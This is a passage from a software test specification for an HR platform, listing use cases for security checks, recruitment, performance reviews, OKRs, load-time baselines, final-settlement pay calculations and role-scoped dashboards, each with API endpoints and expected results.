- **Expected Result:** Sensitive fields excluded from all API responses; bank account masked
- **Verification:** JSON response inspected — no password/hash fields present; account shown as
  masked

### UC-SEC-011 — Audit Trail for Sensitive Operations

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** HR_ADMIN
- **URL:** N/A
- **API Endpoint:** PUT /api/v1/employees/{id} (salary change)
- **Test Steps:**
  1. HR_ADMIN updates employee salary
  2. Audit log captures: who, what, when, before/after values, IP address
  3. Audit log is immutable — no DELETE endpoint for audit records
- **Expected Result:** Every sensitive CRUD operation logged; log cannot be deleted; accessible to
  TENANT_ADMIN
- **Verification:** `GET /api/v1/audit-logs?entity=EMPLOYEE&entityId={id}` shows salary change with
  old/new values

### UC-SEC-012 — File MIME Type Validation

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Security tester
- **URL:** http://localhost:3000/employees/{id}/documents
- **API Endpoint:** POST /api/v1/employees/{id}/documents
- **Test Steps:**
  1. Upload file with `.pdf` extension but actual content is executable (renamed .exe → .pdf)
  2. System checks actual MIME type, not just file extension → rejects
  3. Upload valid PDF → accepted
- **Expected Result:** Server-side MIME validation (magic bytes check); extension spoofing detected
  and rejected
- **Verification:** `POST /api/v1/employees/{id}/documents` with fake-PDF → HTTP 400 "Invalid file
  type"

---

## NU-Hire — Recruitment Expanded Use Cases

### UC-HIRE-009 — Resume Parsing from Upload

- **Priority:** P1
- **Sub-App:** NU-Hire
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/recruitment/candidates/new
- **API Endpoint:** POST /api/v1/recruitment/candidates/parse-resume
- **Playwright Spec:** `frontend/e2e/recruitment-extended.spec.ts`
- **Test Steps:**
  1. Upload candidate PDF resume; system parses name, email, skills, experience
  2. Parsed fields pre-populated in candidate form; agent reviews and adjusts
  3. Submit; candidate created with parsed data
- **Expected Result:** Key fields auto-extracted; manual override available; no candidate created
  without review
- **Negative Test:** Upload non-PDF (DOCX/PNG) → system still attempts parse or shows "Use PDF for
  best results"
- **Verification:** `GET /api/v1/recruitment/candidates/{id}` shows parsed skills and experience
  data

### UC-HIRE-010 — Bulk Candidate Import (CSV)

- **Priority:** P1
- **Sub-App:** NU-Hire
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/recruitment/candidates/import
- **API Endpoint:** POST /api/v1/recruitment/candidates/bulk-import
- **Test Steps:**
  1. Download CSV template; fill with 10 candidates (name, email, position, source)
  2. Upload CSV; system validates and imports
  3. Preview shows 10 candidates before confirmation; 1 with duplicate email flagged
- **Expected Result:** 9 valid candidates imported; 1 duplicate skipped; import summary shown
- **Negative Test:** Import CSV with wrong column headers → "Invalid CSV format — use provided
  template"
- **Verification:** `GET /api/v1/recruitment/candidates?source=CSV_IMPORT&date=today` returns 9
  records

### UC-HIRE-011 — Offer Letter Expiry and Reissue

- **Priority:** P1
- **Sub-App:** NU-Hire
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/recruitment/candidates/{id}/offer
- **API Endpoint:** POST /api/v1/recruitment/offers/{id}/reissue
- **Test Steps:**
  1. Offer sent to candidate; candidate doesn't respond within 7 days (offer expires)
  2. HR_ADMIN extends/reissues offer with updated expiry date
  3. Original offer logged as EXPIRED; new offer has new expiry
- **Expected Result:** Expired offer archived; new offer created; candidate notified
- **Negative Test:** Reissue offer for candidate who already accepted another offer → "Candidate
  already onboarded"
- **Verification:** `GET /api/v1/recruitment/offers?candidateId={id}` shows EXPIRED + new ACTIVE
  offer

### UC-HIRE-012 — Preboarding with Invalid Token

- **Priority:** P0
- **Sub-App:** NU-Hire
- **Persona:** New Hire (unauthenticated)
- **URL:** http://localhost:3000/preboarding?token=INVALID_TOKEN
- **API Endpoint:** GET /api/v1/preboarding/verify?token=INVALID
- **Test Steps:**
  1. Access preboarding URL with tampered/invalid token
  2. System validates token signature and expiry
  3. Display "Invalid or expired invitation link" page
- **Expected Result:** HTTP 401/404 for invalid token; no candidate data exposed; link to contact HR
  shown
- **Verification:** `GET /api/v1/preboarding/verify?token=INVALID` → HTTP 400/401 without any
  personal data

### UC-HIRE-013 — Preboarding with Expired Token

- **Priority:** P0
- **Sub-App:** NU-Hire
- **Persona:** New Hire (unauthenticated)
- **URL:** http://localhost:3000/preboarding?token=EXPIRED_TOKEN
- **API Endpoint:** GET /api/v1/preboarding/verify?token=EXPIRED
- **Test Steps:**
  1. HR sends preboarding link; new hire delays opening for 8 days (token expires at 7 days)
  2. New hire opens expired link → "This invitation has expired"
  3. New hire clicks "Request new link" → HR notified to resend
- **Expected Result:** Expired token rejected; new link request workflow triggered
- **Verification:** `GET /api/v1/preboarding/verify?token=EXPIRED` → HTTP 410 Gone with
  `{expired: true}`

### UC-HIRE-014 — Exit Interview via Public URL

- **Priority:** P1
- **Sub-App:** NU-Hire
- **Persona:** Offboarding Employee (unauthenticated form)
- **URL:** http://localhost:3000/exit-interview/{token}
- **API Endpoint:** POST /api/v1/exit-interviews/submit
- **Test Steps:**
  1. HR sends exit interview link to offboarding employee's personal email
  2. Employee completes interview anonymously (no NU-AURA login required)
  3. Responses stored; HR can view aggregate without individual attribution
- **Expected Result:** Public form accessible without login; responses submitted; anonymity
  preserved if configured
- **Negative Test:** Submit exit interview twice with same token → "Survey already submitted"
- **Verification:** `GET /api/v1/exit-interviews/{id}/responses` shows submission; no employee PII
  in response if anonymous

### UC-HIRE-015 — Career Portal Public Job Listing

- **Priority:** P1
- **Sub-App:** NU-Hire
- **Persona:** External Applicant (unauthenticated)
- **URL:** http://localhost:3000/careers
- **API Endpoint:** GET /api/v1/public/jobs
- **Test Steps:**
  1. Access /careers without login; see published job listings
  2. Filter by department, location, experience level
  3. Apply for job: upload resume, fill form, submit → candidate record created in APPLIED status
- **Expected Result:** Public page renders; PUBLISHED jobs shown; DRAFT/CLOSED jobs hidden;
  application created
- **Negative Test:** Apply with same email twice for same job → "Application already exists for this
  position"
- **Verification:** `GET /api/v1/public/jobs` returns only `status: PUBLISHED` jobs; no auth
  required

### UC-HIRE-016 — Employee Referral with Rewards

- **Priority:** P2
- **Sub-App:** NU-Hire
- **Persona:** Employee
- **URL:** http://localhost:3000/recruitment/referrals
- **API Endpoint:** POST /api/v1/recruitment/referrals
- **Test Steps:**
  1. Employee refers friend for Software Engineer role; enters email and name
  2. Referred candidate receives application link with referral code
  3. Candidate applies; HR tracks referral source
  4. When candidate joins: referral reward ₹5,000 triggered for referrer
- **Expected Result:** Referral tracked end-to-end; reward triggered on hire; referrer notified
- **Negative Test:** Employee refers themselves → "Self-referral not permitted"
- **Verification:** `GET /api/v1/recruitment/referrals?referrerId={id}` shows referral status and
  reward state

### UC-HIRE-017 — Interview Scorecard Submission

- **Priority:** P1
- **Sub-App:** NU-Hire
- **Persona:** Interviewer
- **URL:** http://localhost:3000/recruitment/interviews/{id}/scorecard
- **API Endpoint:** POST /api/v1/recruitment/interviews/{id}/scorecard
- **Test Steps:**
  1. Interviewer completes interview; submits scorecard with ratings per competency
  2. Overall recommendation: Hire / No Hire / Hold
  3. Panel leader aggregates all scorecards; makes final recommendation
- **Expected Result:** Scorecard submitted; candidate status can advance only after all interviewers
  submit
- **Negative Test:** Candidate advances stage before all scorecards submitted → warning "2 pending
  scorecards"
- **Verification:** `GET /api/v1/recruitment/candidates/{id}/scorecards` shows all submitted ratings

### UC-HIRE-018 — Onboarding Document Checklist

- **Priority:** P0
- **Sub-App:** NU-Hire
- **Persona:** New Hire → HR_ADMIN
- **URL:** http://localhost:3000/preboarding/documents
- **API Endpoint:** POST /api/v1/preboarding/documents
- **Test Steps:**
  1. New hire completes preboarding: uploads Aadhaar, PAN, degree certificate, bank proof
  2. HR_ADMIN verifies each document; marks checklist items complete
  3. Offer letter digitally signed; employment agreement signed
  4. Employee account activated with EMPLOYEE role once all items complete
- **Expected Result:** Checklist tracked item-by-item; account not activated until all mandatory
  items complete
- **Negative Test:** Activate account with 2 missing mandatory documents → "Cannot activate: 2
  documents pending"
- **Verification:** `GET /api/v1/preboarding/{id}/checklist` shows per-item completion status

---

## NU-Grow — Performance Expanded Use Cases

### UC-GROW-010 — Calibration Session

- **Priority:** P1
- **Sub-App:** NU-Grow
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/performance/calibration
- **API Endpoint:** POST /api/v1/performance/calibration-sessions
- **Playwright Spec:** `frontend/e2e/performance-extended.spec.ts`
- **Test Steps:**
  1. Create calibration session for Q2 review cycle; invite HR_ADMIN + all department managers
  2. View calibration grid: all employees plotted by manager rating vs peer rating
  3. Manager adjusts rating for employee A from 4 to 3 with justification
  4. Calibrated ratings locked; employees notified
- **Expected Result:** Calibration adjustments tracked with reason; final calibrated ratings
  different from raw scores; locked post-session
- **Negative Test:** Manager adjusts own rating in calibration → "Cannot calibrate your own review"
- **Verification:** `GET /api/v1/performance/reviews/{id}` →
  `calibratedRating: 3, rawRating: 4, calibrationNote: justification`

### UC-GROW-011 — 9-Box Grid Assessment

- **Priority:** P2
- **Sub-App:** NU-Grow
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/performance/9-box
- **API Endpoint:** GET /api/v1/performance/9-box
- **Test Steps:**
  1. View 9-box grid: X-axis = performance (1-3), Y-axis = potential (1-3)
  2. Each employee plotted in correct quadrant based on their scores
  3. Click on "High Performer / High Potential" box (top-right) to see list
  4. Export 9-box data as Excel
- **Expected Result:** Employees correctly positioned; correct count per box; export works
- **Negative Test:** View 9-box for employees with no potential score → excluded from grid with
  count shown
- **Verification:** Quadrant assignment matches performance × potential score matrix in DB

### UC-GROW-012 — PIP (Performance Improvement Plan) Initiation

- **Priority:** P1
- **Sub-App:** NU-Grow
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/performance/pip/new
- **API Endpoint:** POST /api/v1/performance/pips
- **Test Steps:**
  1. Initiate PIP for employee with "Below Expectations" rating; set 90-day plan
  2. Define measurable goals with target dates; assign manager as coach
  3. Employee notified; must acknowledge PIP
  4. Employee cannot submit NOC, referrals, or salary revision requests during active PIP
- **Expected Result:** PIP created; employee acknowledgment required; PIP flag affects other module
  access
- **Negative Test:** Create PIP for employee with "Exceeds Expectations" rating → "PIP not
  applicable for high performers" warning
- **Verification:** `GET /api/v1/employees/{id}/flags` returns `{activePIP: true}`; NOC request
  returns 422

### UC-GROW-013 — PIP Progress Tracking

- **Priority:** P1
- **Sub-App:** NU-Grow
- **Persona:** Manager, HR_ADMIN
- **URL:** http://localhost:3000/performance/pip/{id}
- **API Endpoint:** PUT /api/v1/performance/pips/{id}/progress
- **Test Steps:**
  1. Manager logs weekly check-in notes against each PIP goal
  2. Goal status updated: On Track / At Risk / Completed
  3. After 90 days: outcome selected — Improved / Extended / Termination recommended
- **Expected Result:** Progress tracked per goal per week; outcome drives next action (
  confirm/extend/terminate)
- **Negative Test:** Close PIP without selecting outcome → "PIP outcome is required before closing"
- **Verification:** `GET /api/v1/performance/pips/{id}/progress` shows weekly notes and goal
  statuses

### UC-GROW-014 — Goal Check-In

- **Priority:** P1
- **Sub-App:** NU-Grow
- **Persona:** Employee
- **URL:** http://localhost:3000/performance/goals/{id}/checkin
- **API Endpoint:** POST /api/v1/performance/goals/{id}/checkins
- **Test Steps:**
  1. Employee logs progress on goal: "Q2 Sprint Delivery — 75% complete"; adds note
  2. Manager notified of check-in; can add comment
  3. Progress chart updated with new entry
- **Expected Result:** Check-in stored; progress visible to employee and manager; history shown
- **Negative Test:** Check-in on a goal past its due date → "Goal deadline passed — contact HR to
  extend"
- **Verification:** `GET /api/v1/performance/goals/{id}/checkins` returns all check-ins with
  timestamps

### UC-GROW-015 — OKR Cascade

- **Priority:** P1
- **Sub-App:** NU-Grow
- **Persona:** TENANT_ADMIN → HR_ADMIN → Manager → Employee
- **URL:** http://localhost:3000/performance/okrs
- **API Endpoint:** POST /api/v1/performance/okrs/{id}/cascade
- **Test Steps:**
  1. TENANT_ADMIN creates company OKR: "Achieve 95% client satisfaction"
  2. Department OKR cascaded: "Reduce support tickets by 30%"
  3. Individual OKR cascaded to employee: "Resolve 95% of assigned tickets within SLA"
  4. Hierarchy visible in OKR tree view
- **Expected Result:** 4-level OKR cascade (Company → Dept → Team → Individual); parent-child links
  shown
- **Negative Test:** Employee tries to delete parent OKR → only the cascade owner can delete
- **Verification:** `GET /api/v1/performance/okrs/{id}/children` returns cascaded child OKRs

### UC-GROW-016 — OKR Progress Scoring

- **Priority:** P1
- **Sub-App:** NU-Grow
- **Persona:** Employee
- **URL:** http://localhost:3000/performance/okrs/{id}
- **API Endpoint:** PUT /api/v1/performance/okrs/{id}/progress
- **Test Steps:**
  1. Employee updates key result progress: KR1 = 80%, KR2 = 60%, KR3 = 100%
  2. Objective score = average = 80%; parent OKR score updated proportionally
  3. End-of-cycle score validates against target (e.g., 70% = "Good")
- **Expected Result:** Progress updates roll up; score calculated correctly; parent OKR reflects
  child scores
- **Negative Test:** Enter progress > 100% → "Progress cannot exceed 100%"
- **Verification:** `GET /api/v1/performance/okrs/{id}` → `score: 80, calculatedAt: timestamp`

### UC-GROW-017 — 360 Feedback Anonymity

- **Priority:** P1
- **Sub-App:** NU-Grow
- **Persona:** Peer Employee
- **URL:** http://localhost:3000/performance/360/{token}
- **API Endpoint:** POST /api/v1/performance/360/feedback
- **Test Steps:**
  1. Peer receives 360 feedback request link; submits feedback anonymously
  2. HR_ADMIN can see aggregate responses but not individual reviewer names
  3. Employee being reviewed sees aggregated feedback without individual attribution
- **Expected Result:** Anonymity preserved; minimum reviewer threshold (e.g., 3) before results
  shown to subject
- **Negative Test:** Show 360 feedback with only 1 reviewer → "Minimum 3 responses required for
  confidentiality"
- **Verification:** `GET /api/v1/performance/360/{reviewCycleId}/summary` returns aggregated scores
  without reviewer IDs

### UC-GROW-018 — Aggregate Performance Scores

- **Priority:** P1
- **Sub-App:** NU-Grow
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/performance/reviews/dashboard
- **API Endpoint:** GET /api/v1/performance/reviews/aggregate
- **Test Steps:**
  1. View company-wide review aggregate: distribution by rating tier
  2. See department comparison; identify outlier departments (all "Exceeds" or all "Below")
  3. Score normalized across departments
- **Expected Result:** Accurate distribution; department comparison correct; normalization works
- **Negative Test:** View aggregate for cycle not yet closed → "Review cycle in progress — results
  available after closure"
- **Verification:** Distribution percentages sum to 100%; match individual review scores in DB

### UC-GROW-019 — Training Certificate Generation

- **Priority:** P1
- **Sub-App:** NU-Grow
- **Persona:** Employee
- **URL:** http://localhost:3000/learning/courses/{id}/certificate
- **API Endpoint:** GET /api/v1/learning/courses/{id}/certificate
- **Test Steps:**
  1. Employee completes course with 80%+ assessment score; certificate becomes downloadable
  2. Click "Download Certificate"; PDF with name, course, completion date, signature
  3. Certificate URL shareable; verifiable by 3rd party via unique code
- **Expected Result:** Certificate generated on completion; PDF formatted with OpenPDF; verification
  code unique
- **Negative Test:** Download certificate for incomplete course → "Complete the course to earn your
  certificate"
- **Verification:** `GET /api/v1/learning/courses/{id}/certificate` → 200 only if completion
  status = true

### UC-GROW-020 — Training Prerequisite Enforcement

- **Priority:** P2
- **Sub-App:** NU-Grow
- **Persona:** Employee
- **URL:** http://localhost:3000/learning/courses/{id}
- **API Endpoint:** POST /api/v1/learning/enrollments
- **Test Steps:**
  1. "Advanced React" course requires "React Basics" as prerequisite
  2. Employee without "React Basics" completion tries to enroll in "Advanced React"
  3. System blocks enrollment; shows prerequisite course link
- **Expected Result:** Prerequisite check enforced; enrollment blocked; helpful message with link to
  prereq course
- **Negative Test:** HR_ADMIN enrolls employee bypassing prerequisites → allowed with admin override
  flag logged
- **Verification:** `POST /api/v1/learning/enrollments` without prereq → 422 "Prerequisite not met:
  React Basics"

### UC-GROW-021 — Pulse Survey Launch and Results

- **Priority:** P2
- **Sub-App:** NU-Grow
- **Persona:** HR_ADMIN → Employee
- **URL:** http://localhost:3000/surveys
- **API Endpoint:** POST /api/v1/surveys
- **Test Steps:**
  1. HR_ADMIN creates pulse survey: 5 questions, 5-point Likert scale; targets all employees
  2. Employees notified; complete survey anonymously
  3. HR views results: average scores, response rate, trend vs last survey
- **Expected Result:** Survey distributed; anonymous responses collected; aggregate view only for
  HR; response rate tracked
- **Negative Test:** Employee submits survey twice → "Survey already submitted"
- **Verification:** `GET /api/v1/surveys/{id}/results` returns aggregated scores without individual
  employee IDs

### UC-GROW-022 — One-on-One Notes

- **Priority:** P1
- **Sub-App:** NU-Grow
- **Persona:** Manager ↔ Employee
- **URL:** http://localhost:3000/performance/1on1s/{id}/notes
- **API Endpoint:** POST /api/v1/one-on-ones/{id}/notes
- **Test Steps:**
  1. Manager and employee both add notes during/after 1:1; action items assigned
  2. Action items have owners and due dates; tracked across sessions
  3. Previous session notes visible in current session for continuity
- **Expected Result:** Notes collaborative; action items tracked with completion; history linked
- **Negative Test:** Non-participant (peer) accesses 1:1 notes → HTTP 403
- **Verification:** `GET /api/v1/one-on-ones/{id}/notes` accessible only to manager and employee in
  that 1:1

---

## Performance Baselines — Use Cases

### UC-PERF-001 — Dashboard Load Time

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** All
- **URL:** http://localhost:3000/dashboard
- **API Endpoint:** GET /api/v1/dashboard
- **Test Steps:**
  1. Load dashboard as HR_ADMIN with typical data (50+ employees, 3 months data)
  2. Measure Time-to-Interactive from page navigation
- **Expected Result:** Dashboard loads fully interactive in **< 2 seconds** (P90)
- **Verification:** Chrome DevTools Performance panel; LCP < 2s; no layout shifts after 2s

### UC-PERF-002 — Employee List (500 Records) Load Time

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees
- **API Endpoint:** GET /api/v1/employees?size=20&page=0
- **Test Steps:**
  1. Load employee list with 500 employees in DB; paginated (20/page)
  2. Measure API response time for page 1; measure page render
- **Expected Result:** API response < 500ms; page renders in **< 3 seconds**
- **Verification:** Network tab shows first API call < 500ms; full page interactive < 3s

### UC-PERF-003 — Payroll Run (100 Employees) Completion Time

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/run
- **API Endpoint:** POST /api/v1/payroll/runs
- **Test Steps:**
  1. Trigger payroll run with 100 employees in test tenant
  2. Measure total wall-clock time from submit to "Payroll Complete" status
- **Expected Result:** Payroll run completes in **< 30 seconds** for 100 employees
- **Verification:** Timestamps: `run.startedAt` to `run.completedAt` < 30,000ms

### UC-PERF-004 — API Median Response Time

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Any
- **URL:** N/A (any API)
- **API Endpoint:** All endpoints
- **Test Steps:**
  1. Run 50 sequential API calls across common endpoints (employee CRUD, leave, attendance)
  2. Calculate median response time
- **Expected Result:** Median API response time **< 500ms** across all common endpoints
- **Verification:** Chrome Network tab or Playwright network interceptor; P50 < 500ms; P95 < 2000ms

### UC-PERF-005 — Leave Application Form Submit Response

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/leave/apply
- **API Endpoint:** POST /api/v1/leave-requests
- **Test Steps:**
  1. Submit leave application; measure time from click to success toast
- **Expected Result:** Response (including Kafka publish + DB write + notification enqueue) < 1
  second
- **Verification:** Network: POST response < 800ms; toast appears within 1 second of submit

### UC-PERF-006 — Report Generation (1000-Row Export)

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports
- **API Endpoint:** GET /api/v1/reports/{type}/export
- **Test Steps:**
  1. Export attendance report for all employees for full year (~5000 rows)
  2. Measure download trigger to complete file available time
- **Expected Result:** Export file ready in **< 10 seconds** for 5000 rows
- **Verification:** Response headers indicate streaming; file complete in < 10s

### UC-PERF-007 — WebSocket Notification Delivery Latency

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** ws://localhost:8080/ws
- **API Endpoint:** WebSocket STOMP `/user/{id}/notifications` (not REST)
- **Test Steps:**
  1. HR_ADMIN approves leave; measure time until employee's browser receives WebSocket push
  2. Measure across different network conditions on localhost
- **Expected Result:** Notification delivered via WebSocket in **< 2 seconds** from event trigger
- **Verification:** STOMP message timestamp vs browser receipt timestamp; delta < 2s

### UC-PERF-008 — Concurrent Users Load Test

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** Mixed
- **URL:** All common URLs
- **API Endpoint:** Multiple — GET /api/v1/dashboard, POST /api/v1/leave-requests, GET
  /api/v1/attendance/my
- **Test Steps:**
  1. Simulate 50 concurrent users performing common operations (dashboard, leave application,
     attendance)
  2. Measure error rate and P95 response time under load
- **Expected Result:** Error rate < 1%; P95 response time < 2s under 50 concurrent users
- **Verification:** Playwright parallel test runs or Artillery load test; no 5xx errors in response

---

## Full and Final Settlement (FnF) — Expanded Use Cases

### UC-FNF-001 — Pro-Rata Last Month Salary

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/offboarding/{id}/fnf
- **API Endpoint:** POST /api/v1/fnf/{id}/calculate
- **Playwright Spec:** `frontend/e2e/offboarding.spec.ts`
- **Test Steps:**
  1. Employee last working day: April 20 (20/30 working days)
  2. Monthly CTC: ₹60,000; Basic = ₹24,000 (40%)
  3. Pro-rata calculation: ₹60,000 × (20/30) = ₹40,000
- **Expected Result:** Last salary = ₹40,000; payslip shows "Pro-rata: 20/30 days"
- **Negative Test:** Resignation date after last working date → "Last working day must be on or
  after resignation date"
- **Verification:** `GET /api/v1/fnf/{id}` →
  `lastSalary: 40000, proRataDays: 20, workingDaysInMonth: 30`

### UC-FNF-002 — Leave Encashment Calculation

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/offboarding/{id}/fnf
- **API Endpoint:** POST /api/v1/fnf/{id}/calculate
- **Preconditions:** Employee has 15 unused Earned Leave days; Basic salary ₹24,000/month
- **Test Steps:**
  1. Daily rate = Basic / 26 working days = ₹923.08
  2. Leave encashment = 15 × ₹923.08 = ₹13,846
  3. Verify FnF calculation includes this amount
- **Expected Result:** Leave encashment calculated at Basic/26 per day; only Earned Leave encashed (
  not Casual or Sick)
- **Negative Test:** Encash Casual Leave → "Casual Leave is not eligible for encashment per policy"
- **Verification:** `GET /api/v1/fnf/{id}` →
  `leaveEncashment: 13846, leaveEncashedDays: 15, leaveType: EARNED`

### UC-FNF-003 — Pending Expense Inclusion in FnF

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/offboarding/{id}/fnf
- **API Endpoint:** POST /api/v1/fnf/{id}/calculate
- **Preconditions:** Employee has 2 approved-but-unreimbursed expenses: ₹1,500 + ₹800
- **Test Steps:**
  1. FnF calculation includes pending expense reimbursements: ₹2,300
  2. These added to FnF gross; separately line-itemed in settlement statement
- **Expected Result:** Pending approved expenses included; unapproved expenses excluded; line item
  visible
- **Negative Test:** Include unapproved expense in FnF → "Only approved expenses included in FnF"
- **Verification:** `GET /api/v1/fnf/{id}` →
  `expenseReimbursement: 2300, includedExpenses: [id1, id2]`

### UC-FNF-004 — Loan Deduction in FnF

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/offboarding/{id}/fnf
- **API Endpoint:** POST /api/v1/fnf/{id}/calculate
- **Preconditions:** Employee has outstanding loan balance ₹25,000
- **Test Steps:**
  1. FnF calculation shows: gross amount − loan outstanding = net FnF
  2. Gross FnF = ₹53,846; Loan deduction = ₹25,000; Net FnF = ₹28,846
  3. If net FnF < loan balance → flag for manual resolution
- **Expected Result:** Loan outstanding fully deducted from FnF; if insufficient FnF, alert HR for
  legal recovery
- **Negative Test:** Employee's FnF less than loan balance → "Warning: FnF amount insufficient to
  recover full loan"
- **Verification:** `GET /api/v1/fnf/{id}` → `loanDeduction: 25000, netFnF: 28846`

### UC-FNF-005 — Final Payslip Generation for FnF

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/offboarding/{id}/fnf/payslip
- **API Endpoint:** GET /api/v1/fnf/{id}/payslip
- **Test Steps:**
  1. After all FnF components calculated and approved, generate final payslip
  2. Payslip shows all components: pro-rata salary, leave encashment, expenses, loan deduction
  3. Net payable = ₹28,846; payslip downloadable as PDF
- **Expected Result:** FnF payslip comprehensive; all components itemized; employee can download
  from My Space after clearing
- **Negative Test:** Generate FnF payslip before clearance checklist completed → "FnF clearance
  pending: IT assets not returned"
- **Verification:** PDF contains all line items; net amount matches FnF calculation summary

---

## Dashboard — Expanded Use Cases

### UC-DASH-002 — Executive Dashboard (TENANT_ADMIN)

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** TENANT_ADMIN
- **URL:** http://localhost:3000/dashboard
- **API Endpoint:** GET /api/v1/dashboard/executive
- **Test Steps:**
  1. View executive dashboard: total headcount, active employees, attrition rate, open positions
  2. Revenue per employee metric (if integrated); department cost breakdown
  3. Compliance alerts: PF/ESI filings due, contracts expiring
- **Expected Result:** Executive-level KPIs shown; no individual employee details; compliance alerts
  prominent
- **Negative Test:** Employee accesses executive dashboard → HTTP 403
- **Verification:** `GET /api/v1/dashboard/executive` returns org-level metrics (not individual
  data)

### UC-DASH-003 — Manager Dashboard

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Manager
- **URL:** http://localhost:3000/dashboard
- **API Endpoint:** GET /api/v1/dashboard/manager
- **Test Steps:**
  1. Manager dashboard: team headcount, pending approvals count, team leave today, upcoming reviews
  2. Pending approvals widget: 3 leave requests, 2 timesheets, 1 expense — all actionable from
     dashboard
  3. Team attendance summary for today
- **Expected Result:** Scoped to manager's direct reports only; all pending approvals shown;
  quick-action links work
- **Negative Test:** Manager sees data for teams they don't manage → scoped to own reports only
- **Verification:** Pending approvals count matches `GET /api/v1/approvals/pending?managerId={id}`
  count

### UC-DASH-004 — Employee Dashboard (My Space Overview)

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** http://localhost:3000/dashboard
- **API Endpoint:** GET /api/v1/dashboard/employee
- **Test Steps:**
  1. Employee dashboard: today's attendance status, leave balance summary, upcoming holidays
  2. Pending tasks: complete profile (if incomplete), upcoming birthday/work anniversary
  3. Recent announcements; quick links to common actions (apply leave, submit expense)
- **Expected Result:** Employee-specific data only; no team data; announcements visible; quick
  actions functional
- **Negative Test:** Employee's dashboard shows another employee's leave balance → data isolation
  bug; must return only own data
- **Verification:** All data scoped to logged-in employee's ID; no cross-employee data in response

### UC-DASH-005 — HR Dashboard

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/dashboard
- **API Endpoint:** GET /api/v1/dashboard/hr
- **Test Steps:**
  1. HR dashboard: pending approvals, expiring contracts, probation ending soon, attrition trend
  2. Today's absent employees; late arrivals count
  3. Payroll status for current month; benefits enrollment rate
- **Expected Result:** Comprehensive HR operations overview; all counts accurate; trend charts
  rendered
- **Negative Test:** HR_MANAGER sees sensitive compensation data in dashboard → filtered by
  HR_MANAGER scope
- **Verification:** Each widget's count matches corresponding API endpoint data

### UC-DASH-006 — Predictive Analytics Widget

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** TENANT_ADMIN, HR_ADMIN
- **URL:** http://localhost:3000/dashboard
- **API Endpoint:** GET /api/v1/dashboard/analytics/predictive
- **Test Steps:**
  1. View attrition risk: "3 high-risk employees based on sentiment and engagement scores"
  2. View "Top performers at risk of leaving" widget
  3. Verify data logic (based on survey scores, performance, tenure, engagement)
- **Expected Result:** Risk scores calculated; actionable insights shown; employees listed (with
  privacy controls)
- **Negative Test:** Predictive widget with insufficient data (< 3 months) → "Not enough data for
  predictions yet"
- **Verification:** Risk score algorithm documented; top risks match low engagement + low survey
  scores

### UC-DASH-007 — Org Health Score

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** TENANT_ADMIN
- **URL:** http://localhost:3000/dashboard
- **API Endpoint:** GET /api/v1/dashboard/org-health
- **Test Steps:**
  1. View org health score (composite): attendance rate (25%), engagement (25%), performance (25%),
     retention (25%)
  2. Score = 78/100; each component shown separately
  3. Trend: this quarter vs last quarter
- **Expected Result:** Composite score calculated correctly; components add to 100%; trend accurate
- **Negative Test:** View org health score with incomplete data for one component → component shown
  as "N/A"; composite recalculated
- **Verification:** `GET /api/v1/dashboard/org-health` → formula verified: weighted average of 4
  components

### UC-DASH-008 — Dashboard Widget Independence (Partial Load)

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** Any
- **URL:** http://localhost:3000/dashboard
- **API Endpoint:** GET /api/v1/dashboard/* (individual widget endpoints fail independently)
- **Test Steps:**
  1. Simulate one widget API call failing (e.g., attendance widget → 503)
  2. Other widgets load successfully; failed widget shows error state with retry
  3. No cascading failures; page remains interactive
- **Expected Result:** Widget-level error isolation; partial dashboard usable; error state shown for
  failed widget only
- **Verification:** Network tab shows failed widget request; other widgets have 200 responses; page
  not blank

---

*Total Use Cases: 318*
*Last Updated: 2026-04-02*
*Priority Legend: P0=Blocking, P1=Critical, P2=Important, P3=Nice-to-have*

